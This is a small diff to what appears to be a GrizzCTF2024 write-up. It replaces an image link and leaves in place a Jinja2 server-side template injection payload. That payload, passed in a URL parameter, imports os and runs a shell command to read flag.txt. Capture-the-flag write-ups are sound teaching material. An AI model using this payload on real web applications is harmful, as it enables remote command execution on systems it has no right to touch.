@@ -82,4 +82,5 @@ OR
 ```
 http://MACHINE_IP:10000/?name={{config.__class__.__init__.__globals__[%27__builtins__%27][%27__import__%27](%27os%27).popen(%27type%20flag.txt%27).read()}}
 ```
-![alt text](image.png)
+![image](https://github.com/supaaasuge/GrizzCTF2024-Official/assets/158092262/c3db20d4-e983-4e92-a905-badd5fcdb734)
+
